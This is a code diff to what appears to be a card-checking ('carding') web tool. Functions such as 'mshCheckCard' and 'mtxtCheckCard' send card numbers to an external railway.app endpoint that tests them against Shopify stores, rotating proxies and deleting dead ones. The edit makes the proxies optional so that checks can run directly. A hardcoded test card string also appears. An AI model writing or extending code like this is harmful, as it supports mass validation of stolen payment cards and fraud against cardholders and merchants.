@@ -5935,16 +5935,18 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         };
 
         // Check a single card with site/proxy rotation
+        // Proxies are OPTIONAL — if none configured, calls go DIRECT (faster, no proxy delay)
         const mshCheckCard = async (cardCC: string): Promise<{ status: string; response: string; price: string }> => {
           const shuffledProxies = [...mshProxies].filter(p => !mshFailedProxyIds.includes(p.id)).sort(() => Math.random() - 0.5);
-          if (shuffledProxies.length === 0) return { status: 'unknown', response: 'No proxies', price: '$0.00' };
+          // If no proxies, do a single direct attempt per site (fastest path)
+          const proxyAttempts: (typeof mshProxies[0] | null)[] = shuffledProxies.length > 0 ? shuffledProxies : [null];
           const maxSites = Math.min(2, mshAvailableSites.length);
           for (let si = 0; si < maxSites; si++) {
             const site = mshAvailableSites[si % mshAvailableSites.length];
-            for (const proxy of shuffledProxies) {
-              if (mshFailedProxyIds.includes(proxy.id)) continue;
-              const result = await mshCallWithRetry(cardCC, site.url, mshFormatProxy(proxy));
-              if (result.proxyDead) {
+            for (const proxy of proxyAttempts) {
+              if (proxy && mshFailedProxyIds.includes(proxy.id)) continue;
+              const result = await mshCallWithRetry(cardCC, site.url, proxy ? mshFormatProxy(proxy) : '');
+              if (result.proxyDead && proxy) {
                 mshFailedProxyIds.push(proxy.id);
                 supabase.from('user_proxies').delete().eq('id', proxy.id).then(() => {});
                 continue;
@@ -6396,7 +6398,8 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
          const MAX_MTXT_SITE_ATTEMPTS = 5; // Try up to 5 random sites per card
          const mtxtCheckCard = async (cardCC: string): Promise<{ status: string; response: string; price: string }> => {
            const availableProxies = [...mtxtProxies].filter(p => !mtxtFailedProxyIds.includes(p.id)).sort(() => Math.random() - 0.5);
-           if (availableProxies.length === 0) return { status: 'error', response: 'No proxies available', price: '$0.00' };
+           // Proxies are OPTIONAL — if none configured, calls go DIRECT (fastest path, no proxy delay)
+           const hasProxies = availableProxies.length > 0;
 
            let finalResult: any = null;
 
@@ -6410,14 +6413,17 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
               if (mtxtDeadSiteUrls.has(site.url)) continue; // Skip if removed by another card
               let siteResult: any = null;
 
-              // Pick ONE random proxy (not all proxies per site — too slow for mass check)
-              const currentProxies = availableProxies.filter(p => !mtxtFailedProxyIds.includes(p.id));
-              if (currentProxies.length === 0) { finalResult = { status: 'error', response: 'All proxies dead', price: '$0.00' }; break; }
-              const proxy = currentProxies[Math.floor(Math.random() * currentProxies.length)];
+              // Pick ONE random proxy (or none for direct call)
+              let proxy: any = null;
+              if (hasProxies) {
+                const currentProxies = availableProxies.filter(p => !mtxtFailedProxyIds.includes(p.id));
+                if (currentProxies.length === 0) { hasProxies && (finalResult = { status: 'error', response: 'All proxies dead', price: '$0.00' }); break; }
+                proxy = currentProxies[Math.floor(Math.random() * currentProxies.length)];
+              }
 
-              siteResult = await mtxtCallWithRetry(cardCC, site.url, mtxtFormatProxy(proxy));
+              siteResult = await mtxtCallWithRetry(cardCC, site.url, proxy ? mtxtFormatProxy(proxy) : '');
 
-              if (siteResult.proxyDead) {
+              if (siteResult.proxyDead && proxy) {
                 mtxtFailedProxyIds.push(proxy.id);
                 supabase.from('user_proxies').delete().eq('id', proxy.id).then(() => {});
                 // Try next site with different proxy
@@ -6438,7 +6444,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
               try { const parsed = JSON.parse(siteResult.rawResponse || ''); if (parsed && (parsed.Gateway || parsed.Response || parsed.Price !== undefined || parsed.status || parsed.message)) isValidApiResponse = true; } catch {}
               const rl = (siteResult.rawResponse || '').toLowerCase();
               const isProxyError = !isValidApiResponse && (rl.includes('407') || rl.includes('proxy error') || rl.includes('proxy authentication') || rl.includes('connection refused') || rl.includes('proxy connect') || rl.includes('tunneling socket'));
-              if (isProxyError) {
+              if (isProxyError && proxy) {
                 mtxtFailedProxyIds.push(proxy.id);
                 supabase.from('user_proxies').delete().eq('id', proxy.id).then(() => {});
                 if (siteAttempt + 1 < cardSites.length) { await new Promise(r => setTimeout(r, 200)); continue; }
@@ -9712,10 +9718,12 @@ ${resultsDisplay || "Waiting for results..."}
         return `${randomProxy.ip}:${randomProxy.port}`;
       };
 
-      // Two API endpoints for checking sites
+      // API endpoint for checking sites — proxy is OPTIONAL (direct call when empty)
       const API_ENDPOINTS = [
-        (site: string, cc: string, proxy: string) => 
-          `https://web-production-9db0.up.railway.app/shopify?cc=${cc}&site=${site}&proxy=${proxy}`,
+        (site: string, cc: string, proxy: string) =>
+          proxy
+            ? `https://web-production-9db0.up.railway.app/shopify?cc=${cc}&site=${site}&proxy=${proxy}`
+            : `https://web-production-9db0.up.railway.app/shopify?cc=${cc}&site=${site}`,
       ];
       const TEST_CC = "4266841674104656|03|27|908";
 
